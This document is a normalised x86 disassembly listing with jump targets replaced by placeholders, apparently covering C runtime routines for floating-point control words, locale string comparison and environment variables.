mov edx eax
add eax eax
shr ecx 0x1f
or eax ecx
mov [ ebp - 0xc ] eax
shr edx 0x1f
lea eax [ edi + edi ]
or eax edx
add esi 0xffff
mov [ ebp - 0x8 ] eax
test si si
jg r-xdata
mov ecx [ ebp - 0x48 ]
movzx edx [ eax ]
movzx ecx [ ecx ]
and [ ebp - 0x44 ] 0x0
imul ecx edx
mov edx [ edi - 0x4 ]
lea ebx [ edx + ecx ]
cmp ebx edx
jb r-xdata
inc esi
inc esi
inc [ ebp - 0x58 ]
dec [ ebp - 0x40 ]
cmp [ ebp - 0x40 ] 0x0
jg r-xdata
lea ecx [ ebp + ecx - 0x20 ]
add eax 0x8
mov [ ebp - 0x6c ] ecx
mov [ ebp - 0x68 ] eax
cmp [ eax + 0x4 ] esi
jne r-xdata
cmp [ ebp - 0x20 ] esi
jne r-xdata
cmp [ ebp - 0xe ] 0xffffffff
jne r-xdata
mov ecx [ ebp - 0x10 ]
and ecx 0x1ffff
cmp ecx 0x18000
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov edi [ ebp - 0xc ]
mov edx [ ebp - 0xc ]
shr [ ebp - 0x8 ] 0x1
shl ecx 0x1f
shr edi 0x1
or edi ecx
mov ecx [ ebp - 0x10 ]
shl edx 0x1f
shr ecx 0x1
or ecx edx
dec eax
mov [ ebp - 0xc ] edi
mov [ ebp - 0x10 ] ecx
jne r-xdata
inc [ ebp - 0x50 ]
mov ecx [ ebp - 0x58 ]
mov edx [ ebp - 0x40 ]
add ecx ecx
mov [ ebp - 0x50 ] edx
test edx edx
jle r-xdata
add edi 0xc002
test di di
jle r-xdata
mov [ ebp - 0x5c ] 0x1
cmp eax ecx
jae r-xdata
cmp [ eax ] esi
je r-xdata
xor eax eax
mov [ ebp - 0x16 ] ax
jmp r-xdata
inc [ ebp - 0xe ]
and [ ebp - 0xe ] 0x0
cmp [ ebp - 0xa ] 0xffffffff
jne r-xdata
mov eax 0x7fff
cmp si ax
jb r-xdata
test [ ebp - 0x10 ] 0x1
je r-xdata
cmp [ ebp - 0x50 ] eax
je r-xdata
add edi 0xffff
test di di
jge r-xdata
test [ ebp - 0x8 ] 0x80000000
jne r-xdata
add [ ebp - 0x6c ] 0x2
sub [ ebp - 0x68 ] 0x2
dec [ ebp - 0x50 ]
cmp [ ebp - 0x50 ] 0x0
jg r-xdata
inc [ esi ]
cmp [ ebp - 0x5c ] 0x0
mov [ esi - 0x4 ] eax
je r-xdata
mov [ ebp - 0x18 ] esi
mov ax [ ebp - 0xe ]
or esi [ ebp - 0x5c ]
mov [ ebp - 0x20 ] ax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x1e ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x1a ] eax
mov [ ebp - 0x16 ] si
jmp r-xdata
xor eax eax
xor ecx ecx
cmp [ ebp - 0x5c ] ax
mov [ ebp - 0x1c ] eax
sete cl
mov [ ebp - 0x20 ] eax
dec ecx
and ecx 0x80000000
add ecx 0x7fff8000
mov [ ebp - 0x18 ] ecx
jmp r-xdata
inc [ ebp - 0xa ]
jmp r-xdata
and [ ebp - 0xa ] 0x0
mov ecx 0xffff
cmp [ ebp - 0x6 ] cx
jne r-xdata
or [ ebp - 0x10 ] 0x1
mov eax 0x8000
mov ecx eax
cmp [ ebp - 0x10 ] cx
ja r-xdata
mov eax edi
neg eax
movzx eax ax
add edi eax
test di di
jg r-xdata
mov eax [ ebp - 0xc ]
mov ecx [ ebp - 0x10 ]
shl [ ebp - 0x10 ] 0x1
mov edx eax
add eax eax
shr ecx 0x1f
or eax ecx
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x8 ]
shr edx 0x1f
add eax eax
or eax edx
add edi 0xffff
mov [ ebp - 0x8 ] eax
test di di
jg r-xdata
mov eax [ ebp - 0x6c ]
movzx ecx [ eax ]
mov eax [ ebp - 0x68 ]
movzx eax [ eax ]
mov edx [ esi - 0x4 ]
imul ecx eax
and [ ebp - 0x5c ] 0x0
lea eax [ edx + ecx ]
cmp eax edx
jb r-xdata
mov eax [ ebp - 0x44 ]
inc [ ebp - 0x6 ]
jmp r-xdata
mov [ ebp - 0x6 ] ax
inc esi
jmp r-xdata
cmp [ ebp - 0xe ] 0xffffffff
jne r-xdata
mov ecx [ ebp - 0x10 ]
and ecx 0x1ffff
cmp ecx 0x18000
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov esi [ ebp - 0xc ]
mov edx [ ebp - 0xc ]
shr [ ebp - 0x8 ] 0x1
shl ecx 0x1f
shr esi 0x1
or esi ecx
mov ecx [ ebp - 0x10 ]
shl edx 0x1f
shr ecx 0x1
or ecx edx
dec eax
mov [ ebp - 0xc ] esi
mov [ ebp - 0x10 ] ecx
jne r-xdata
inc [ ebp - 0x54 ]
inc [ ebp - 0xe ]
and [ ebp - 0xe ] 0x0
cmp [ ebp - 0xa ] 0xffffffff
jne r-xdata
mov eax 0x7fff
cmp di ax
jb r-xdata
test [ ebp - 0x10 ] 0x1
je r-xdata
cmp [ ebp - 0x54 ] eax
je r-xdata
mov ax [ ebp - 0xe ]
or edi [ ebp - 0x48 ]
mov [ ebp - 0x20 ] ax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x1e ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x1a ] eax
mov [ ebp - 0x16 ] di
jmp r-xdata
xor eax eax
xor ecx ecx
cmp [ ebp - 0x48 ] ax
mov [ ebp - 0x1c ] eax
sete cl
mov [ ebp - 0x20 ] eax
dec ecx
and ecx 0x80000000
add ecx 0x7fff8000
mov [ ebp - 0x18 ] ecx
inc [ ebp - 0xa ]
jmp r-xdata
and [ ebp - 0xa ] 0x0
mov ecx 0xffff
cmp [ ebp - 0x6 ] cx
jne r-xdata
or [ ebp - 0x10 ] 0x1
inc [ ebp - 0x6 ]
jmp r-xdata
mov [ ebp - 0x6 ] ax
inc edi
jmp r-xdata
sub_439288
xor eax eax
test bl 0x10
je r-xdata
test bl 0x8
je r-xdata
inc eax
test bl 0x4
je r-xdata
or eax 0x4
test bl 0x2
je r-xdata
or eax 0x8
test bl 0x1
je r-xdata
or eax 0x10
test ebx 0x80000
je r-xdata
or eax 0x20
mov ecx ebx
mov edx 0x300
and ecx edx
push esi
mov esi 0x200
je r-xdata
or eax 0x2
mov ecx ebx
and ecx 0x30000
je r-xdata
cmp ecx 0x100
je r-xdata
or eax edx
cmp ecx 0x10000
jne r-xdata
or eax 0x400
cmp ecx esi
je r-xdata
retn
or eax 0x1000
pop esi
test ebx 0x40000
je r-xdata
or eax esi
jmp r-xdata
or eax 0x800
jmp r-xdata
cmp ecx edx
jne r-xdata
or eax 0xc00
jmp r-xdata
sub_439316
xor eax eax
test dl 0x10
je r-xdata
push ebx
push esi
push edi
mov ebx 0x200
test dl 0x8
je r-xdata
mov eax 0x80
test dl 0x4
je r-xdata
or eax ebx
test dl 0x2
je r-xdata
or eax 0x400
test dl 0x1
je r-xdata
or eax 0x800
mov edi 0x100
test edx 0x80000
je r-xdata
or eax 0x1000
mov ecx edx
mov esi 0x300
and ecx esi
je r-xdata
or eax edi
mov ecx 0x3000000
pop edi
and edx ecx
pop esi
pop ebx
cmp edx 0x1000000
je r-xdata
cmp ecx edi
je r-xdata
or eax 0x8040
cmp edx 0x2000000
je r-xdata
or eax 0x2000
cmp ecx ebx
je r-xdata
or eax 0x40
retn
cmp edx ecx
jne r-xdata
or eax 0x4000
jmp r-xdata
cmp ecx esi
jne r-xdata
retn
or eax 0x8000
retn
or eax 0x6000
jmp r-xdata
sub_4393b6
mov edi edi
push ebp
mov ebp esp
sub esp 0x14
push ebx
push esi
push edi
fwait
fnstcw [ ebp - 0x8 ]
mov ebx [ ebp - 0x8 ]
xor edx edx
test bl 0x1
je r-xdata
test bl 0x4
je r-xdata
push 0x10
pop edx
test bl 0x8
je r-xdata
or edx 0x8
test bl 0x10
je r-xdata
or edx 0x4
test bl 0x20
je r-xdata
or edx 0x2
test bl 0x2
je r-xdata
or edx 0x1
movzx ecx bx
mov eax ecx
mov esi 0xc00
and eax esi
mov edi 0x300
je r-xdata
or edx 0x80000
and ecx edi
je r-xdata
cmp eax 0x400
je r-xdata
or edx 0x20000
cmp ecx 0x200
jne r-xdata
or edx 0x100
cmp eax 0x800
je r-xdata
mov edi [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
mov eax edi
not eax
and eax edx
and ecx edi
or eax ecx
mov [ ebp + 0xc ] eax
cmp eax edx
je r-xdata
or edx 0x40000
test ebx 0x1000
je r-xdata
or edx 0x10000
jmp r-xdata
or edx 0x200
jmp r-xdata
cmp eax esi
jne r-xdata
xor esi esi
cmp [ rw-data ] esi
je r-xdata
mov ebx eax
call sub_439288
movzx eax ax
mov [ ebp - 0x4 ] eax
fldcw [ ebp - 0x4 ]
fwait
fnstcw [ ebp - 0x4 ]
mov ebx [ ebp - 0x4 ]
xor edx edx
test bl 0x1
je r-xdata
or edx edi
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
and edi 0x308031f
mov [ ebp - 0x14 ] edi
stmxcsr [ ebp - 0x10 ]
mov eax [ ebp - 0x10 ]
test al al
jns r-xdata
test bl 0x4
je r-xdata
push 0x10
pop edx
test eax 0x200
je r-xdata
push 0x10
pop esi
test bl 0x8
je r-xdata
or edx 0x8
test eax 0x400
je r-xdata
or esi 0x8
test bl 0x10
je r-xdata
or edx 0x4
test eax 0x800
je r-xdata
or esi 0x4
test bl 0x20
je r-xdata
or edx 0x2
test eax 0x1000
je r-xdata
or esi 0x2
test bl 0x2
je r-xdata
or edx 0x1
test eax 0x100
je r-xdata
or esi 0x1
movzx ecx bx
mov eax ecx
and eax esi
je r-xdata
or edx 0x80000
mov ecx eax
mov ebx 0x6000
and ecx ebx
je r-xdata
or esi 0x80000
and ecx 0x300
je r-xdata
cmp eax 0x400
je r-xdata
mov edi 0x8040
and eax edi
sub eax 0x40
je r-xdata
cmp ecx 0x2000
je r-xdata
or edx 0x20000
cmp ecx 0x200
jne r-xdata
or edx 0x100
cmp eax 0x800
je r-xdata
or esi 0x2000000
sub eax 0x7fc0
je r-xdata
or esi 0x100
cmp ecx 0x4000
je r-xdata
mov [ ebp + 0xc ] edx
mov eax edx
or edx 0x40000
test ebx 0x1000
je r-xdata
or edx 0x10000
jmp r-xdata
or edx 0x200
jmp r-xdata
cmp eax esi
jne r-xdata
call sub_439316
push eax
mov [ ebp - 0xc ] eax
call sub_439ec4
pop ecx
stmxcsr [ ebp - 0xc ]
mov ecx [ ebp - 0xc ]
xor edx edx
test cl cl
jns r-xdata
mov eax esi
jmp r-xdata
or esi 0x3000000
jmp r-xdata
sub eax 0x40
jne r-xdata
or esi 0x200
jmp r-xdata
cmp ecx ebx
jne r-xdata
or edx 0x300
jmp r-xdata
test ecx 0x200
je r-xdata
push 0x10
pop edx
mov ecx eax
xor ecx [ ebp + 0xc ]
or eax [ ebp + 0xc ]
test ecx 0x8031f
je r-xdata
mov eax [ ebp - 0x14 ]
mov edx eax
and eax [ ebp + 0x8 ]
not edx
and edx esi
or edx eax
cmp edx esi
jne r-xdata
or esi 0x1000000
jmp r-xdata
or esi 0x300
jmp r-xdata
test ecx 0x400
je r-xdata
or edx 0x8
or eax 0x80000000
test ecx 0x800
je r-xdata
or edx 0x4
test ecx 0x1000
je r-xdata
or edx 0x2
mov esi 0x100
test esi ecx
je r-xdata
or edx 0x1
mov eax ecx
and eax ebx
je r-xdata
or edx 0x80000
and ecx edi
sub ecx 0x40
je r-xdata
cmp eax 0x2000
je r-xdata
or edx 0x2000000
sub ecx 0x7fc0
je r-xdata
or edx esi
cmp eax 0x4000
je r-xdata
or edx 0x3000000
jmp r-xdata
sub ecx 0x40
jne r-xdata
or edx 0x200
jmp r-xdata
cmp eax ebx
jne r-xdata
mov eax edx
or edx 0x1000000
jmp r-xdata
or edx 0x300
jmp r-xdata
sub_4396c5
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_423619
cmp [ ebp + 0x14 ] 0xffffffff
jge r-xdata
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call [ GetStringTypeW@IAT ]
xor eax eax
jmp r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_439703
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
jmp r-xdata
test ecx ecx
jne r-xdata
dec ecx
cmp [ eax ] 0x0
je r-xdata
dec ecx
mov eax [ ebp + 0x8 ]
sub eax ecx
dec eax
pop ebp
retn
inc eax
sub_439721
mov edi edi
push ebp
mov ebp esp
sub esp 0x2c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x14 ]
push ebx
push esi
push edi
xor edi edi
mov ebx edx
mov esi ecx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x1c ] eax
cmp [ rw-data ] edi
jne r-xdata
cmp [ ebp + 0x10 ] edi
jle r-xdata
push 0x1
mov eax r--data
push eax
push 0x1
push eax
push edi
push edi
call [ CompareStringW@IAT ]
test eax eax
je r-xdata
cmp [ ebp + 0x10 ] 0xffffffff
jge r-xdata
push [ ebp + 0x10 ]
mov eax ebx
call sub_439703
pop ecx
mov [ ebp + 0x10 ] eax
call [ GetLastError@IAT ]
cmp eax 0x78
jne r-xdata
mov [ rw-data ] 0x1
jmp r-xdata
mov edx [ ebp + 0x18 ]
cmp edx edi
jle r-xdata
xor eax eax
jmp r-xdata
cmp edx 0xffffffff
jl r-xdata
mov eax [ ebp - 0x1c ]
push edx
call sub_439703
mov edx eax
pop ecx
mov [ ebp + 0x18 ] edx
jmp r-xdata
mov [ rw-data ] 0x2
lea esp [ ebp - 0x38 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_4234de
leave
retn
mov ecx [ rw-data ]
cmp ecx 0x2
je r-xdata
xor edi edi
xor ebx ebx
cmp [ ebp + 0x8 ] edi
jne r-xdata
cmp ecx edi
je r-xdata
cmp [ ebp + 0x1c ] edi
jne r-xdata
mov eax [ esi ]
mov eax [ eax + 0x14 ]
mov [ ebp + 0x8 ] eax
xor eax eax
inc eax
cmp ecx eax
jne r-xdata
push [ ebp + 0x8 ]
call sub_433812
mov esi eax
pop ecx
cmp esi 0xffffffff
je r-xdata
mov eax [ esi ]
mov eax [ eax + 0x4 ]
mov [ ebp + 0x1c ] eax
mov [ ebp - 0x28 ] edi
cmp [ ebp + 0x1c ] edi
jne r-xdata
cmp esi [ ebp + 0x1c ]
je r-xdata
cmp [ ebp + 0x10 ] edi
je r-xdata
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
mov [ ebp + 0x1c ] ecx
push [ ebp + 0x18 ]
push [ ebp - 0x1c ]
push [ ebp + 0x10 ]
push [ ebp - 0x24 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ CompareStringA@IAT ]
mov esi eax
test ebx ebx
je r-xdata
push 0x0
push 0x0
lea eax [ ebp + 0x10 ]
push eax
push [ ebp - 0x24 ]
push esi
push [ ebp + 0x1c ]
call sub_43385b
mov ebx eax
add esp 0x18
test ebx ebx
je r-xdata
cmp [ ebp + 0x10 ] edx
jne r-xdata
cmp edx edi
jne r-xdata
mov eax esi
push ebx
call sub_424869
push edi
call sub_424869
pop ecx
pop ecx
push 0x0
push 0x0
lea eax [ ebp + 0x18 ]
push eax
push [ ebp - 0x1c ]
push esi
push [ ebp + 0x1c ]
call sub_43385b
mov edi eax
add esp 0x18
test edi edi
jne r-xdata
cmp edx eax
jg r-xdata
push 0x2
mov esi [ MultiByteToWideChar@IAT ]
push edi
push edi
push [ ebp + 0x10 ]
push ebx
push 0x9
push [ ebp + 0x1c ]
call esi
mov ebx eax
mov [ ebp - 0x2c ] ebx
cmp ebx edi
je r-xdata
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x1c ] edi
push ebx
call sub_424869
pop ecx
jmp r-xdata
cmp [ ebp + 0x10 ] eax
jle r-xdata
mov edi 0x400
test ebx ebx
jle r-xdata
lea eax [ ebp - 0x18 ]
push eax
push [ ebp + 0x1c ]
call [ GetCPInfo@IAT ]
test eax eax
je r-xdata
push 0x3
jmp r-xdata
and [ ebp - 0x20 ] 0x0
push 0xffffffe0
xor edx edx
pop eax
div ebx
cmp eax 0x2
jb r-xdata
cmp [ ebp + 0x10 ] edi
jle r-xdata
pop eax
jmp r-xdata
push ebx
push [ ebp - 0x20 ]
push [ ebp + 0x10 ]
push [ ebp - 0x24 ]
push 0x1
push [ ebp + 0x1c ]
call esi
test eax eax
je r-xdata
lea eax [ ebx + ebx + 0x8 ]
cmp eax edi
ja r-xdata
cmp [ ebp + 0x18 ] edi
jle r-xdata
cmp [ ebp - 0x18 ] 0x2
jb r-xdata
push [ ebp - 0x20 ]
call sub_428160
mov eax [ ebp - 0x28 ]
pop ecx
jmp r-xdata
push 0x0
push 0x0
push [ ebp + 0x18 ]
push [ ebp - 0x1c ]
push 0x9
push [ ebp + 0x1c ]
call esi
mov ebx eax
test ebx ebx
je r-xdata
push eax
call sub_425484
pop ecx
test eax eax
je r-xdata
call sub_433a10
mov eax esp
test eax eax
je r-xdata
cmp [ ebp - 0x18 ] 0x2
jae r-xdata
cmp [ ebp - 0x12 ] 0x0
lea eax [ ebp - 0x12 ]
je r-xdata
jle r-xdata
mov [ ebp - 0x20 ] eax
jmp r-xdata
mov [ eax ] 0xdddd
mov [ eax ] 0xcccc
jmp r-xdata
cmp [ ebp - 0x12 ] 0x0
lea eax [ ebp - 0x12 ]
je r-xdata
xor eax eax
inc eax
jmp r-xdata
mov dl [ eax + 0x1 ]
test dl dl
je r-xdata
xor edi edi
push 0xffffffe0
xor edx edx
pop eax
div ebx
cmp eax 0x2
jb r-xdata
cmp [ ebp - 0x20 ] 0x0
je r-xdata
add eax 0x8
mov dl [ eax + 0x1 ]
test dl dl
je r-xdata
mov cl [ ebx ]
cmp cl [ eax ]
jb r-xdata
push ebx
push edi
push [ ebp + 0x18 ]
push [ ebp - 0x1c ]
push 0x1
push [ ebp + 0x1c ]
call esi
test eax eax
je r-xdata
lea eax [ ebx + ebx + 0x8 ]
cmp eax edi
ja r-xdata
mov ecx [ ebp - 0x1c ]
mov cl [ ecx ]
cmp cl [ eax ]
jb r-xdata
inc eax
inc eax
cmp [ eax ] 0x0
jne r-xdata
cmp cl dl
jbe r-xdata
push edi
call sub_428160
pop ecx
push ebx
push edi
push [ ebp - 0x2c ]
push [ ebp - 0x20 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ CompareStringW@IAT ]
mov [ ebp - 0x28 ] eax
push eax
call sub_425484
pop ecx
test eax eax
je r-xdata
call sub_433a10
mov edi esp
test edi edi
je r-xdata
inc eax
inc eax
cmp [ eax ] 0x0
jne r-xdata
cmp cl dl
jbe r-xdata
jmp r-xdata
mov edi eax
jmp r-xdata
mov [ eax ] 0xdddd
add eax 0x8
mov [ edi ] 0xcccc
add edi 0x8
jmp r-xdata
jmp r-xdata
test edi edi
je r-xdata
sub_439a91
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_423619
push [ ebp + 0x24 ]
mov edx [ ebp + 0x14 ]
push [ ebp + 0x20 ]
lea ecx [ ebp - 0x10 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_439721
add esp 0x18
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_439ad3
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x10 ]
call sub_423619
mov edx [ ebp + 0x10 ]
xor ebx ebx
cmp edx ebx
jne r-xdata
cmp [ ebp + 0x8 ] ebx
jne r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
cmp [ ebp + 0xc ] ebx
je r-xdata
call sub_425eb1
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_423d36
add esp 0x14
cmp [ ebp - 0x4 ] bl
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
push esi
mov esi 0x7fffffff
cmp edx esi
jbe r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
pop ebx
leave
retn
mov eax [ ebp - 0x10 ]
mov ecx [ eax + 0x10 ]
cmp ecx ebx
jne r-xdata
call sub_425eb1
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_423d36
add esp 0x14
jmp r-xdata
push [ eax + 0x8 ]
lea eax [ ebp - 0x10 ]
push edx
push [ ebp + 0xc ]
push edx
push [ ebp + 0x8 ]
push 0x1001
push ecx
push eax
call sub_439a91
add esp 0x20
cmp eax ebx
jne r-xdata
lea eax [ ebp - 0x10 ]
push eax
push edx
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4236a0
add esp 0x10
jmp r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
add eax 0xfffffffe
call sub_425eb1
mov [ eax ] 0x16
cmp [ ebp - 0x4 ] bl
je r-xdata
mov eax esi
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
pop esi
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_439bcd
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ rw-data ]
jmp r-xdata
mov eax [ esi ]
test eax eax
jne r-xdata
push edi
push eax
push [ ebp + 0x8 ]
call sub_4388b3
add esp 0xc
test eax eax
jne r-xdata
mov eax esi
sub eax [ rw-data ]
sar eax 0x2
neg eax
add esi 0x4
mov eax [ esi ]
mov al [ edi + eax ]
cmp al 0x3d
je r-xdata
mov eax esi
sub eax [ rw-data ]
sar eax 0x2
jmp r-xdata
test al al
je r-xdata
pop esi
pop ebp
retn
sub_439c1f
mov edi edi
push ebp
mov ebp esp
push ecx
push edi
mov edi eax
xor eax eax
mov ecx edi
test edi edi
je r-xdata
pop edi
leave
retn
cmp [ edi ] eax
je r-xdata
push esi
inc eax
push 0x4
push eax
call sub_42894a
mov esi eax
pop ecx
pop ecx
mov [ ebp - 0x4 ] esi
test esi esi
jne r-xdata
add ecx 0x4
inc eax
cmp [ ecx ] 0x0
jne r-xdata
mov eax [ edi ]
test eax eax
jne r-xdata
push 0x9
call sub_42af2d
jmp r-xdata
push eax
call sub_439f36
mov [ esi ] eax
add esi 0x4
add edi 0x4
and [ esi ] eax
mov eax [ ebp - 0x4 ]
pop esi
pop ecx
sub_439c79
mov edi edi
push ebp
mov ebp esp
sub esp 0x14
mov eax [ ebp + 0x8 ]
push ebx
xor ebx ebx
mov [ ebp - 0xc ] ebx
cmp eax ebx
jne r-xdata
push esi
mov esi [ eax ]
push edi
mov [ ebp - 0x4 ] esi
cmp esi ebx
je r-xdata
call sub_425eb1
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_423d36
add esp 0x14
or eax 0xffffffff
jmp r-xdata
call sub_425eb1
mov [ eax ] 0x16
push 0x3d
push esi
call sub_43a047
mov edi eax
pop ecx
pop ecx
mov [ ebp - 0x14 ] edi
cmp edi ebx
je r-xdata
pop ebx
leave
retn
cmp esi edi
je r-xdata
xor eax eax
cmp [ edi + 0x1 ] bl
sete al
mov [ ebp - 0x8 ] eax
mov eax [ rw-data ]
cmp eax [ rw-data ]
jne r-xdata
cmp eax ebx
jne r-xdata
call sub_439c1f
mov [ rw-data ] eax
mov esi [ rw-data ]
mov [ ebp - 0x10 ] esi
cmp esi ebx
je r-xdata
cmp [ ebp + 0xc ] ebx
je r-xdata
or eax 0xffffffff
sub edi [ ebp - 0x4 ]
push [ ebp - 0x4 ]
call sub_439bcd
mov edi eax
cmp edi ebx
pop ecx
jl r-xdata
cmp [ ebp - 0x8 ] ebx
jne r-xdata
cmp [ rw-data ] ebx
je r-xdata
cmp [ ebp - 0x8 ] ebx
jne r-xdata
cmp [ esi ] ebx
je r-xdata
xor eax eax
jmp r-xdata
push 0x4
call sub_428905
pop ecx
mov [ rw-data ] eax
cmp eax ebx
je r-xdata
call sub_4388cd
test eax eax
je r-xdata
push [ ebp - 0x4 ]
call sub_424869
mov eax [ ebp + 0x8 ]
pop ecx
mov [ eax ] ebx
cmp edi ebx
jge r-xdata
lea esi [ esi + edi * 4 ]
push [ esi ]
call sub_424869
pop ecx
cmp [ ebp - 0x8 ] ebx
jne r-xdata
pop edi
pop esi
mov [ eax ] ebx
cmp [ rw-data ] ebx
jne r-xdata
lea eax [ edi + 0x2 ]
cmp eax edi
jl r-xdata
neg edi
cmp [ esi ] ebx
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ esi ] eax
mov eax [ ebp + 0x8 ]
mov [ eax ] ebx
jmp r-xdata
push 0x4
call sub_428905
pop ecx
mov [ rw-data ] eax
cmp eax ebx
je r-xdata
cmp eax 0x3fffffff
jae r-xdata
mov eax [ esi + 0x4 ]
mov [ esi ] eax
mov eax [ ebp - 0x10 ]
inc edi
lea esi [ eax + edi * 4 ]
cmp edi 0x3fffffff
jae r-xdata
cmp [ ebp + 0xc ] ebx
je r-xdata
mov [ eax ] ebx
push eax
push 0x4
push [ rw-data ]
call sub_4289e4
add esp 0xc
cmp eax ebx
je r-xdata
push 0x4
push edi
push [ rw-data ]
call sub_4289e4
add esp 0xc
cmp eax ebx
je r-xdata
cmp [ ebp - 0x8 ] ebx
je r-xdata
mov esi [ ebp - 0x4 ]
push 0x1
push esi
call sub_4258f0
inc eax
pop ecx
inc eax
push eax
call sub_42894a
mov edi eax
pop ecx
pop ecx
cmp edi ebx
je r-xdata
mov edx [ ebp - 0x4 ]
lea ecx [ eax + edi * 4 ]
mov [ ecx ] edx
mov [ ecx + 0x4 ] ebx
mov ecx [ ebp + 0x8 ]
mov [ ecx ] ebx
jmp r-xdata
mov eax [ ebp - 0xc ]
jmp r-xdata
push [ ebp - 0x4 ]
call sub_424869
mov eax [ ebp + 0x8 ]
pop ecx
mov [ eax ] ebx
push esi
push esi
call sub_4258f0
inc eax
pop ecx
inc eax
push eax
push edi
call sub_42aae1
add esp 0xc
test eax eax
je r-xdata
mov [ rw-data ] eax
mov ecx [ ebp - 0x8 ]
mov eax edi
sub eax esi
add eax [ ebp - 0x14 ]
mov [ eax ] bl
inc eax
neg ecx
sbb ecx ecx
not ecx
and ecx eax
push ecx
push edi
call [ SetEnvironmentVariableA@IAT ]
test eax eax
jne r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_423c0e
add esp 0x14
push edi
call sub_424869
pop ecx
or [ ebp - 0xc ] 0xffffffff
call sub_425eb1
mov [ eax ] 0x2a
sub_439ec4
push 0x8
push r--data
call sub_42b398
xor eax eax
cmp [ rw-data ] eax
je r-xdata
call sub_42b3dd
retn
test [ ebp + 0x8 ] 0x40
je r-xdata
and [ ebp + 0x8 ] 0xffffffbf
ldmxcsr [ ebp + 0x8 ]
cmp [ rw-data ] eax
je r-xdata
mov [ ebp - 0x4 ] eax
ldmxcsr [ ebp + 0x8 ]
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
jmp r-xdata
sub_439f36
mov edi edi
push ebp
mov ebp esp
push ebx
xor ebx ebx
cmp [ ebp + 0x8 ] ebx
jne r-xdata
push esi
push edi
push [ ebp + 0x8 ]
call sub_4258f0
mov esi eax
inc esi
push esi
call sub_425484
mov edi eax
pop ecx
pop ecx
cmp edi ebx
je r-xdata
xor eax eax
jmp r-xdata
xor eax eax
push [ ebp + 0x8 ]
push esi
push edi
call sub_42aae1
add esp 0xc
test eax eax
je r-xdata
pop ebx
pop ebp
retn
mov eax edi
jmp r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_423c0e
add esp 0x14
pop edi
pop esi
sub_439f8b
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x10 ]
call sub_423619
mov eax [ ebp + 0x8 ]
xor ebx ebx
cmp eax ebx
jne r-xdata
push esi
mov esi [ ebp - 0xc ]
cmp [ esi + 0x8 ] ebx
jne r-xdata
call sub_425eb1
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_423d36
add esp 0x14
cmp [ ebp - 0x4 ] bl
je r-xdata
movzx cx [ eax ]
movzx ecx cx
cmp cx bx
jne r-xdata
push [ ebp + 0xc ]
push eax
call sub_43a070
pop ecx
pop ecx
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
movzx edx cl
test [ edx + esi + 0x1d ] 0x4
je r-xdata
movzx ecx cx
cmp [ ebp + 0xc ] ecx
jne r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
pop ebx
leave
retn
movzx edx cx
cmp [ ebp + 0xc ] edx
je r-xdata
inc eax
mov dl [ eax ]
cmp dl bl
je r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
pop esi
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
inc eax
movzx ecx cx
movzx edx dl
shl ecx 0x8
or ecx edx
cmp [ ebp + 0xc ] ecx
jne r-xdata
xor eax eax
mov eax [ ebp - 0x8 ]
